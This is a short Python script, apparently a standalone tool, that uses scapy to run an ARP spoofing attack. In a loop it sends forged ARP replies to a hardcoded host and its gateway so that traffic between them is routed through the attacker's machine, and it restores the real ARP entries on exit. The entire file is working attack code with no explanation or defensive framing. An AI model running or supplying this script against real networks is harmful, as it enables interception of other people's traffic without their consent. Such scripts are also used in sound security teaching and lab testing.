from scapy.all import ARP, send
import time
from utils import get_mac

target_ip = "192.168.1.10"
gateway_ip = "192.168.1.1"

target_mac = get_mac(target_ip)
gateway_mac = get_mac(gateway_ip)

def spoof(target_ip, target_mac, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(dest_ip, dest_mac, source_ip, source_mac):
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                 psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

try:
    print("Starting ARP spoofing...")
    while True:
        spoof(target_ip, target_mac, gateway_ip)
        spoof(gateway_ip, gateway_mac, target_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print("Restoring network...")
    restore(target_ip, target_mac, gateway_ip, gateway_mac)
    restore(gateway_ip, gateway_mac, target_ip, target_mac)
    print("Stopped.")
